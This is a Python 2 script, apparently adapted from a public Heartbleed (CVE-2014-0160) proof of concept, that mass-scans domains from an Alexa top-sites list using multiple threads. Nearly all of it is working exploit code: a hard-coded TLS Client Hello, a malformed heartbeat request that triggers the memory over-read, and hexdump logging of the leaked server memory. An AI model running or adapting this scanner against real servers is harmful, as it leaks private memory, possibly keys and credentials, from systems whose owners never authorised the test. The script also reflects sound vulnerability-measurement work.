#!/usr/bin/python

# Quick and dirty demonstration of CVE-2014-0160 by Jared Stafford (jspenguin@jspenguin.org)
# The author disclaims copyright to this source code.

# Quickly and dirtily modified by Mustafa Al-Bassam (mus@musalbas.com) to test the Alexa top X.
#     modified by Alexander Riccio (alexander@riccio.com) to test multiple domains in parallel

# Usage example: python ssltest.py top-1m.csv 10

import sys
import struct
import socket
import time
import select
import re
import logging
from optparse import OptionParser
import Queue as queue
import threading
try:
    from colorama import init, Fore
    init(autoreset=True)
    NO_COLORAMA = False
except ImportError:
    NO_COLORAMA = True
    print "Install colorama for coloring!"

options = OptionParser(usage='%prog file max numthreads', description='Test for SSL heartbleed vulnerability (CVE-2014-0160) on multiple domains, takes in Alexa top X CSV file')

def h2bin(x):
    return x.replace(' ', '').replace('\n', '').decode('hex')

hello = h2bin('''
16 03 02 00  dc 01 00 00 d8 03 02 53
43 5b 90 9d 9b 72 0b bc  0c bc 2b 92 a8 48 97 cf
bd 39 04 cc 16 0a 85 03  90 9f 77 04 33 d4 de 00
00 66 c0 14 c0 0a c0 22  c0 21 00 39 00 38 00 88
00 87 c0 0f c0 05 00 35  00 84 c0 12 c0 08 c0 1c
c0 1b 00 16 00 13 c0 0d  c0 03 00 0a c0 13 c0 09
c0 1f c0 1e 00 33 00 32  00 9a 00 99 00 45 00 44
c0 0e c0 04 00 2f 00 96  00 41 c0 11 c0 07 c0 0c
c0 02 00 05 00 04 00 15  00 12 00 09 00 14 00 11
00 08 00 06 00 03 00 ff  01 00 00 49 00 0b 00 04
03 00 01 02 00 0a 00 34  00 32 00 0e 00 0d 00 19
00 0b 00 0c 00 18 00 09  00 0a 00 16 00 17 00 08
00 06 00 07 00 14 00 15  00 04 00 05 00 12 00 13
00 01 00 02 00 03 00 0f  00 10 00 11 00 23 00 00
00 0f 00 01 01                                  
''')

hb = h2bin(''' 
18 03 02 00 03
01 40 00
''')

def hexdump(s):
    for b in xrange(0, len(s), 16):
        lin = [c for c in s[b : b + 16]]
        hxdat = ' '.join('%02X' % ord(c) for c in lin)
        pdat = ''.join((c if 32 <= ord(c) <= 126 else '.' )for c in lin)
        logging.debug('  %04x: %-48s %s' % (b, hxdat, pdat))
    #print

def recvall(s, length, timeout=5):
    endtime = time.time() + timeout
    rdata = ''
    remain = length
    while remain > 0:
        rtime = endtime - time.time() 
        if rtime < 0:
            return None
        r, w, e = select.select([s], [], [], 5)
        if s in r:
            try:
                data = s.recv(remain)
            except Exception, e:
                return None
            # EOF?
            if not data:
                return None
            rdata += data
            remain -= len(data)
    return rdata
        

def recvmsg(s):
    hdr = recvall(s, 5)
    if hdr is None:
        logging.debug('Unexpected EOF receiving record header - server closed connection')
        return None, None, None
    typ, ver, ln = struct.unpack('>BHH', hdr)
    pay = recvall(s, ln, 10)
    if pay is None:
        logging.debug('Unexpected EOF receiving record payload - server closed connection')
        return None, None, None
    logging.debug(' ... received message: type = %d, ver = %04x, length = %d' % (typ, ver, len(pay)))
    return typ, ver, pay

def hit_hb(s):
    s.send(hb)
    while True:
        typ, ver, pay = recvmsg(s)
        if typ is None:
            logging.debug('No heartbeat response received, server likely not vulnerable')
            return False

        if typ == 24:
            logging.debug('Received heartbeat response:')
            hexdump(pay)
            if len(pay) > 3:
                logging.debug('WARNING: server returned more data than it should - server is vulnerable!')
                return True
            else:
                logging.debug('Server processed malformed heartbeat, but did not return any extra data.')
                return False

        if typ == 21:
            logging.debug('Received alert:')
            hexdump(pay)
            logging.debug('Server returned error, likely not vulnerable')
            return False

def is_vulnerable(domain):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(2)
    logging.debug('Connecting to %s...' % domain)
    sys.stdout.flush()
    try:
        s.connect((domain, 443))
    except Exception, e:
        return None
    logging.debug('Sending Client Hello to %s...' % domain)
    sys.stdout.flush()
    s.send(hello)
    logging.debug('Waiting for Server Hello from %s...' % domain)
    sys.stdout.flush()
    while True:
        typ, ver, pay = recvmsg(s)
        if typ == None:
            logging.debug('Server (domain: %s) closed connection without sending Server Hello.' % domain)
            return None
        # Look for server hello done message.
        if typ == 22 and ord(pay[0]) == 0x0E:
            break

    logging.debug('Sending heartbeat request to %s...' % domain)
    sys.stdout.flush()
    s.send(hb)
    return hit_hb(s)

def single_threaded_main(args):
    counter_nossl = 0;
    counter_notvuln = 0;
    counter_vuln = 0;

    with open(args[0], 'r') as f:
        for line in f:
            rank, domain = line.split(',')
            domain = domain.strip()
            print "Testing %s... " % domain,
            sys.stdout.flush();
            result = is_vulnerable(domain);
            if result is None:
                print "no SSL."
                counter_nossl += 1;
            elif result:
                print "vulnerable."
                counter_vuln += 1;
            else:
                print "not vulnerable."
                counter_notvuln += 1;

            if int(rank) >= int(args[1]):
                break

    print
    print "No SSL: " + str(counter_nossl)
    print "Vulnerable: " + str(counter_vuln)
    print "Not vulnerable: " + str(counter_notvuln)



class aScanner(threading.Thread):
    def __init__(self, queue_of_domains_to_check, counter_nossl, counter_notvuln, counter_vuln, limit, vulnQueue):
        threading.Thread.__init__(self)
        self.queue_of_domains_to_check = queue_of_domains_to_check
        #self.counter_nossl = counter_nossl
        #self.counter_notvuln = counter_notvuln
        #self.counter_vuln  = counter_vuln
        self.limit = limit
        self.vulnQueue = vulnQueue
        self.do_work = True

    def stopWork(self):
        self.do_work = False
    def run( self ):
        counter = 0
        try:
            while self.do_work:
                    aDomain = self.queue_of_domains_to_check.get(timeout=1)
                    if aDomain:
                        logging.debug("Testing %s... " % aDomain)
                        sys.stdout.flush()
                        result = is_vulnerable(aDomain);
                        if result is None:
                            sys.stdout.flush()
                            print "no SSL:         %s||" % aDomain
##                            self.counter_nossl += 1
                            #counter_nossl += 1

                        elif result:
                            self.vulnQueue.put(aDomain)
                            sys.stdout.flush()
                            if NO_COLORAMA:
                                print "vulnerable:     %s||" % aDomain
                                #self.counter_vuln += 1
                                #counter_vuln += 1
                            else:
                                sys.stdout.flush()
                                print Fore.RED, "vulnerable:     %s||" % aDomain
                                #self.counter_vuln += 1
                                #counter_vuln += 1
                        else:
                            sys.stdout.flush()
                            print "not vulnerable: %s||" % aDomain
                            #self.counter_notvuln += 1
                            #counter_notvuln += 1
                        sys.stdout.flush()
                        #if self.counter_nossl + self.counter_vuln + self.counter_notvuln >= self.limit:
                        if counter >= self.limit:
                            return
                        else:
                            counter += 1
                            #print "DEBUG: noSSL: %i VULN: %i NOTvuln: %i" % (self.counter_nossl, self.counter_vuln, self.counter_notvuln)
                
        except queue.Empty:
            pass

        #print
        #print "No SSL: " + str(counter_nossl)
        #print "Vulnerable: " + str(counter_vuln)
        #print "Not vulnerable: " + str(counter_notvuln)





def populate_queue_with_domains_from_file(fileName, theQueue):
    with open(fileName, 'r') as f:
        for line in f:
            try:
                rank, domain = line.split(',')
                domain = domain.strip()
                theQueue.put(domain)
            except ValueError:
                print "Bad domain! %s" % domain

def multi_threaded_main(options, args):
    print "|| signifies end of line, hack to deal with multithreaded printing"
    counter_nossl = 0;
    counter_notvuln = 0;
    counter_vuln = 0;

##
##    with open(args[0], 'r') as f:
##        for line in f:
##            rank, domain = line.split(',')
##            domain = domain.strip()
    theQueue = queue.Queue()
    vulnQueue = queue.Queue()
    populate_queue_with_domains_from_file(args[0], theQueue)
    threads = []
    numThreads = int(args[2])
    limit = int(args[1])
    [threads.append(aScanner(theQueue, counter_nossl, counter_notvuln, counter_vuln, limit, vulnQueue)) for _ in range(numThreads)]
    [thread.start() for thread in threads]
    [thread.join() for thread in threads]
    a_plain_old_counter = 0
    vulnerable_domains = []
    try:
        
        while a_plain_old_counter < limit:
            a_vulnerable_domain = vulnQueue.get()
            vulnerable_domains(a_vulnerable_domain)
            a_plain_old_counter += 1
    except queue.Empty:
        pass
    print "Vulnerable domains:"
    [thread.stopWork() for thread in threads]
##    try:
##        while True:
##            aDomain = theQueue.get(timeout=1)
##            if aDomain:
##                print "Testing %s... " % aDomain,
##                sys.stdout.flush();
##                result = is_vulnerable(aDomain);
##                if result is None:
##                    print "no SSL."
##                    counter_nossl += 1;
##                elif result:
##                    print "vulnerable."
##                    counter_vuln += 1;
##                else:
##                    print "not vulnerable."
##                    counter_notvuln += 1;
##
##                if counter_nossl + counter_vuln + counter_notvuln >= int(args[1]):
##                    break
##
##            
##    except queue.Empty:
##        pass
##
##
##    print
##    print "No SSL: " + str(counter_nossl)
##    print "Vulnerable: " + str(counter_vuln)
##    print "Not vulnerable: " + str(counter_notvuln)




def main():
    opts, args = options.parse_args()
    if len(args) < 3:
        options.print_help()
        return
    #logging.basicConfig(level=logging.WARN)
    logging.basicConfig(level=logging.DEBUG)
    #single_threaded_main(args)
    multi_threaded_main(opts, args)

if __name__ == '__main__':
    main()
